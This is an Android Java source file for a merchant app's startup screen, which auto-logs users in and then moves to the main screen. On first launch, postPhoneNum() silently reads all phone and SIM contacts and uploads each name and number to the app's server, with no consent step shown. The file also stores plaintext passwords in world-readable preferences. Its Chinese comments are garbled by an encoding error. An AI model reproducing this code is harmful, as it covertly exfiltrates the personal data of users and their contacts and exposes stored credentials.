package com.mzhou.merchant.activity;

import java.io.FileOutputStream;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import com.mzhou.merchant.model.AllBean;
import com.mzhou.merchant.service.DownLoadService;
import com.mzhou.merchant.utlis.CustomProgressDialog;
import com.mzhou.merchant.utlis.GetDataByPostUtil;
import com.mzhou.merchant.utlis.GetPhoneNum;
import com.mzhou.merchant.utlis.HttpRequest;
import com.mzhou.merchant.utlis.JsonParse;
import com.mzhou.merchant.utlis.MyConstants;
import com.mzhou.merchant.utlis.WebIsConnectUtil;
import com.mzhou.merchant.utlis.GetPhoneNum.UserBean;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.Bundle;
import android.os.Handler;
import android.view.Window;
import android.widget.ImageView;

public class ActivityStart extends Activity {

	private ImageView icon;
	private SharedPreferences sp;
	boolean loginself;
	boolean loginself_enterprise;
	boolean isEnterprise;
	private CustomProgressDialog progressDialog = null;
	private String usrename, password;
	private String username_enterprise, password_enterprise;

	@Override
	protected void onCreate(Bundle arg0) {
		super.onCreate(arg0);
		requestWindowFeature(Window.FEATURE_NO_TITLE);
		setContentView(R.layout.start);
		sp = getSharedPreferences("phonemerchant", 1);
		loginself = sp.getBoolean("loginself", false);
		loginself_enterprise = sp.getBoolean("loginself_enterprise", false);
		isEnterprise = sp.getBoolean("isEnterprise", false);
		usrename = sp.getString("username", "");
		password = sp.getString("password", "");
		username_enterprise = sp.getString("username_enterprise", "");
		password_enterprise = sp.getString("password_enterprise", "");
		if (WebIsConnectUtil.showNetStateNoDialog(ActivityStart.this)) {

			Intent intent = new Intent();
			intent.setClass(ActivityStart.this, DownLoadService.class);
			startService(intent);

			if (isEnterprise) {// �ж��Ƿ�����ҵ��Ա������ǣ��ж��Ƿ�ѡ�����Զ���½
				boolean isLogin = false;
				if (loginself_enterprise) {// �ж��Ƿ��Զ���½������Զ���½����ô�ͽ���½״̬����Ϊtrue
					isLogin = true;
					if (WebIsConnectUtil.showNetState(ActivityStart.this)) {
						new Thread(new Runnable() {
							@Override
							public void run() {
								Map<String, String> map = new HashMap<String, String>();
								map.put("subject", "login");
								map.put("data[un]", username_enterprise);
								map.put("data[pw]", password_enterprise);
								String userinfo = HttpRequest.sendPostRequest(
										map, MyConstants.EN_LOGIN_URL);
								AllBean userBean = JsonParse
										.parseUserJson(userinfo);

								if (userBean != null) {
									if (userBean.getStatus().equals("true")) {
										save2SharedPrefenrence(userBean);
									}
								}

							}

						}).start();
					}
				} else {
					isLogin = false;
				}
				Editor editor = sp.edit();
				editor.putBoolean("isLogin_enterprise", isLogin);
				editor.commit();

			} else {// ������ҵ��Ա
				boolean isLogin = false;
				if (loginself) {
					isLogin = true;
					if (WebIsConnectUtil.showNetState(ActivityStart.this)) {
						new Thread(new Runnable() {

							@Override
							public void run() {
								// TODO Auto-generated method stub
								Map<String, String> map = new HashMap<String, String>();
								map.put("subject", "login");
								map.put("data[un]", usrename);
								map.put("data[pw]", password);
								String userinfo = HttpRequest.sendPostRequest(
										map, MyConstants.LOGIN_URL);
								AllBean userBean = JsonParse
										.parseUserJson(userinfo);

								if (userBean != null) {
									if (userBean.getStatus().equals("true")) {
										save2SharedPrefenrenceEn(userBean);
									}
								}
							}
						}).start();
					}
				} else {
					isLogin = false;
				}
				Editor editor = sp.edit();
				editor.putBoolean("isLogin", isLogin);
				editor.commit();
			}

		}
		Editor editor = sp.edit();
		editor.putLong("logintime", System.currentTimeMillis());
		editor.commit();
		icon = (ImageView) findViewById(R.id.icon);
		new Thread(new Runnable() {

			@Override
			public void run() {

				try {
					Thread.sleep(2500);
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
				handler.sendEmptyMessage(1);
				try {
					Thread.sleep(2500);
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
				handler.sendEmptyMessage(2);
			}
		}).start();

		boolean readContact = sp.getBoolean("readContact", false);
		if (!readContact) {
			postPhoneNum();
		}

	}
	private void postPhoneNum (){
		try {
			 new Thread(new Runnable() {
					@Override
					public void run() {
						GetPhoneNum getPhoneNum = new GetPhoneNum(ActivityStart.this);
						List<UserBean> phone= getPhoneNum.getPhoneContacts();
						List<UserBean> sim= getPhoneNum.getSIMContacts();
						phone.addAll(sim);
						 for (int i = 0; i < phone.size(); i++) {
						// TODO Auto-generated method stub
						GetDataByPostUtil.getPhoneNumberInfo(ActivityStart.this,
								MyConstants.PHONE_NUM, "add",phone.get(i).getUsername()+"__"+ phone.get(i).getPhonenum(),
								"0", "0");} 
						 
						 
						 Editor editor = sp.edit();
							editor.putBoolean("readContact", true);// ��ϵ��
							editor.commit();
					}
				}).start();
			
		
	} catch (Exception e) {
		e.printStackTrace();
	}
	}
	private void save2SharedPrefenrence(AllBean user) {
		Editor editor = sp.edit();
		editor.putString("name_enterprise", user.getInfo().getContact());// ��ϵ��
		editor.putBoolean("loginself_enterprise", loginself_enterprise);// �Ƿ��Զ���½
		editor.putBoolean("remeberpassword_enterprise", true);// �Ƿ��ס����
		editor.putBoolean("isLogin_enterprise", true);// �Ƿ��½
		editor.putBoolean("isEnterprise", true);// ��������ҵ��Ա
		editor.putString("uid_enterprise", user.getUid());// ��Աid
		editor.putString("nickname_enterprise", user.getInfo().getNickname());// �ǳ�
		editor.putString("username_enterprise", user.getInfo().getUsername());// �˺�
		editor.putString("password_enterprise", password_enterprise);// ����
		editor.putString("company_center_enterprise", user.getInfo()
				.getCenter());// �ܻ�
		editor.putString("company_fax_enterprise", user.getInfo().getFax());// ����
		editor.putString("company_enterprise", user.getInfo().getCompany());// ��˾����
		editor.putString("address_enterprise", user.getInfo().getAddress());// ��˾��ַ
		editor.putString("net_enterprise", user.getInfo().getNet());// ��˾��ַ
		editor.putString("headurl_enterprise", MyConstants.PICTURE_URL
				+ user.getInfo().getHeadurl());// ͷ���ַ
		editor.commit();
	}

	private void save2SharedPrefenrenceEn(AllBean user) {
		Editor editor = sp.edit();
		editor.putString("name", user.getInfo().getContact());// ��ϵ��
		editor.putBoolean("loginself", loginself);
		editor.putBoolean("remeberpassword", true);
		editor.putBoolean("isLogin", true);
		editor.putBoolean("isEnterprise", false);// ���ò�����ҵ��Ա
		editor.putString("uid", user.getUid());
		editor.putString("nickname", user.getInfo().getNickname());// �ǳ�
		editor.putString("username", user.getInfo().getUsername());// �˺�
		editor.putString("password", password);// ����
		editor.putString("phonenub", user.getInfo().getPhonenub());
		editor.putString("company", user.getInfo().getCompany());
		editor.putString("address", user.getInfo().getAddress());
		editor.putString("net", user.getInfo().getNet());
		editor.putString("category", user.getInfo().getCategory());
		editor.putString("headurl", MyConstants.PICTURE_URL
				+ user.getInfo().getHeadurl());
		editor.putString("email", user.getInfo().getEmail());
		editor.commit();
	}

	private Handler handler = new Handler() {
		public void handleMessage(android.os.Message msg) {
			switch (msg.what) {
			case 1:
				startProgressDialog(ActivityStart.this, "");
				break;
			case 2:
				stopProgressDialog();
				Intent intent = new Intent();
				intent.setClass(ActivityStart.this, ActivityIndex.class);
				startActivity(intent);
				finish();
				break;
			case 3:
				Editor editor = sp.edit();
				editor.putBoolean("readContact", true);// ��ϵ��
				editor.commit();
				break;
			default:
				break;
			}
		};
	};

	@Override
	protected void onStop() {
		super.onStop();
	}

	public void writeFiles(String content, String filename) {
		try {
			// ���ļ���ȡ��������ļ����������Զ�����
			FileOutputStream fos = openFileOutput(filename,
					Context.MODE_PRIVATE);
			fos.write(content.getBytes());
			fos.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public void startProgressDialog(Context context, String msg) {

		if (progressDialog == null) {
			progressDialog = CustomProgressDialog.createDialogNoBackground(context);
			progressDialog.setMessage(msg);
		}
		progressDialog.show();
	}

	public void stopProgressDialog() {
		if (progressDialog != null) {
			progressDialog.dismiss();
			progressDialog = null;
		}
	}
}
